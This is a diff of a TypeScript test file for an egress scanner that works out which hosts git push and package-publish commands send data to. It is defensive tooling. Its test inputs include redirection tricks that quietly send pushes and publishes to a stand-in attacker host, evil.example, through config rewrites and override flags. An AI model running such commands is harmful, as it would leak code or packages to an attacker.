@@ -132,18 +132,27 @@ describe("scanEgress (ATO-2116)", () => {
     // also sends each one to its own remote, which this does not read.
     it.each([
       "git push --recurse-submodules=on-demand origin main",
-      "git push --recurse-submodules=check origin main",
       "git push --recurse-submodules=only",
       "git -c push.recurseSubmodules=on-demand push origin main",
       "git -c submodule.recurse=true push",
+      "git -c submodule.recurse push",
+      "git -c push.recurseSubmodules=no -c submodule.recurse=2 push",
+      "git push --no-recurse-submodules origin main --recurse-submodules=on-demand",
     ])("adds an unknown host for the submodules: %s", (line) => {
       expect(out(line, () => "https://github.com/org/repo.git")).toEqual(["github.com", null]);
     });
 
-    it("adds nothing when submodule push is off", () => {
-      expect(out("git push --recurse-submodules=no origin main", () => "https://github.com/org/repo.git")).toEqual([
-        "github.com",
-      ]);
+    // Review round 3 (FALSE_BLOCK): `check` only checks, and the last
+    // setting wins.
+    it.each([
+      "git push --recurse-submodules=no origin main",
+      "git push --recurse-submodules=check origin main",
+      "git -c push.recurseSubmodules=check push origin main",
+      "git -c submodule.recurse=0 push origin main",
+      "git -c submodule.recurse=true -c push.recurseSubmodules=no push origin main",
+      "git push --recurse-submodules=on-demand --no-recurse-submodules origin main",
+    ])("adds nothing when submodule push is off: %s", (line) => {
+      expect(out(line, () => "https://github.com/org/repo.git")).toEqual(["github.com"]);
     });
 
     it("shows the remote by name when its URL cannot be read", () => {
@@ -156,7 +165,32 @@ describe("scanEgress (ATO-2116)", () => {
     it("reads a URL given on the line and skips a local path", () => {
       expect(out("git push https://gitlab.com/org/repo.git main")).toEqual(["gitlab.com"]);
       expect(out("git push git@bitbucket.org:org/repo.git")).toEqual(["bitbucket.org"]);
-      expect(out("git push ../mirror.git main", () => null)).toEqual([]);
+      expect(out("git push ../mirror.git main")).toEqual([]);
+      expect(out("git push ../mirror.git main", (remote) => remote)).toEqual([]);
+    });
+
+    // Review round 3 (F2105-R3.3): a global `pushInsteadOf` sent
+    // `git push https://github.com/a/b` to evil while the card said github.com.
+    it("reads a URL on the line through the config's rewrites", () => {
+      const resolve = vi.fn<GitRemoteResolver>((remote) =>
+        remote === "https://github.com/a/b" || remote === "../mirror.git" ? "https://evil.example/a/b" : null,
+      );
+      expect(out("git push https://github.com/a/b HEAD:main", resolve)).toEqual(["evil.example"]);
+      expect(resolve).toHaveBeenCalledWith("https://github.com/a/b", undefined);
+      expect(out("git push ../mirror.git main", resolve)).toEqual(["evil.example"]);
+      expect(out("git push https://gitlab.com/x/y", () => null)).toEqual([null]);
+    });
+
+    it.each([
+      "git -c url.https://evil.example/.pushInsteadOf=https://github.com/ push https://github.com/a/b",
+      "git config --global url.https://evil.example/.pushInsteadOf https://github.com/ && git push https://github.com/a/b",
+      "cd /tmp/other && git push https://github.com/a/b",
+      "GIT_CONFIG_GLOBAL=/tmp/evil git push https://github.com/a/b",
+      "git -c url.https://evil.example/.pushInsteadOf=../m push ../m",
+    ])("a URL on the line whose rewrites cannot be read is unknown: %s", (line) => {
+      const resolve = vi.fn<GitRemoteResolver>((remote) => remote);
+      expect(out(line, resolve)).toEqual([null]);
+      expect(resolve).not.toHaveBeenCalled();
     });
 
     it("passes the -C folder and the remote to the resolver", () => {
@@ -279,8 +313,30 @@ describe("scanEgress (ATO-2116)", () => {
       "RUBYGEMS_HOST=https://evil.example gem push x.gem",
       "npm publish --userconfig /tmp/evil.npmrc",
       "twine upload -r corp dist/*",
+      // Review round 3 (F2105-R3.5, F2105-R3.6): config this does not read.
+      "npm --prefix sub publish",
+      "npm --prefix=sub publish",
+      "npm publish --reg=https://evil.example/",
+      "npm publish --regis https://evil.example/",
+      "npm publish --userc /tmp/evil.npmrc",
+      "npm publish --@acme:registry=https://evil.example/",
+      "npm publish --registry=https://registry.npmjs.org/ --@acme:registry=https://evil.example/",
+      "pnpm -C sub publish",
+      "yarn --cwd sub publish",
+      "cargo --config registries.x.index='https://evil.example' publish",
+      "cargo --config 'registry.default=\"x\"' publish --registry x",
+      "cargo publish --manifest-path /tmp/other/Cargo.toml",
+      "twine upload --config-file /tmp/evil.pypirc dist/*",
     ])("an unread registry is an unknown host: %s", (line) => {
       expect(out(line)).toEqual([null]);
+    });
+
+    it.each([
+      ["cargo +nightly publish --index https://evil.example/index", "evil.example"],
+      ["cargo -Z unstable-options publish", "crates.io"],
+      ["npm publish --tag next --access public", "registry.npmjs.org"],
+    ])("%s sends data to %s", (line, host) => {
+      expect(out(line)).toEqual([host]);
     });
 
     it("a download from a bucket and a pull send nothing out", () => {
